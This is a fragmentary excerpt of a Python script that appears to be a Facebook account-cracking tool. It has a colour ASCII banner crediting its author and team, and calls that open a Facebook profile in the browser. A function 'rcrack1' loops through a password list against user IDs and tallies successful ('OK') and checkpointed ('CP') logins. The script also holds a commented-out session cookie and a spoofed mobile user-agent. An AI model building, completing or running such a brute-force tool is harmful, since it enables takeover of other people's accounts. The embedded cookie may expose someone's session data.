...
logo = ("""
 ...
 \033[1;94m______  __       __  _______    ______   __    __ 
\033[1;94m/      |/  \     /  |/       \  /      \ /  \  /  |
\033[1;94m$$$$$$/ $$  \   /$$ |$$$$$$$  |/$$$$$$  |$$  \ $$ |
  \033[1;94m$$ |  $$$  \ /$$$ |$$ |__$$ |$$ |__$$ |$$$  \$$ |
\033[1;94m  $$ |  $$$$  /$$$$ |$$    $$< $$    $$ |$$$$  $$ |
...
\033[1;94m       [+]        CREATED BY   :  Imran Ahmed              \033[1;94m[+]

\033[1;94m       [+]        ON GITHUB    :  MR-IMRAN-60             \033[1;94m[+]

\033[1;94m       [+]        TEAM         :  FIRE-X        \033[1;94m[+]
...
class Main:
    ...
    def __init__(self):
        ...
        os.system('xdg-open https://facebook.com/Mohammad.Rakib240')
        ...
        if Alif in ["2","02"]:
            ...
            os.system('xdg-open https://www.facebook.com/Mohammad.Rakib240')
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mIMRAN\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
    ...
    # 'cookie': 'datr=GsWpZAvFRltbu2jGMzHz56qF; sb=GsWpZGmD7_-Gy7dTwF4WU1Sa; m_pixel_ratio=2.34375; dpr=2.34375; dnonce=AWlvpE0aivnTukQO19r2RWr2w_PwldOkWxrApDbZ7OIBn_DN-UV6LwSxXO2dJ_dDkHi4dIZ2unBx3-hD_TIOgdb-; wd=461x894; fr=04D1tGadBrky49FDl..BkqcUa.dN.AAA.0.0.BkqcYm.AWV6cJrC2dc',
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
        ...
        sys.stdout.write(f'\r\033[m[IMRAN👑] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
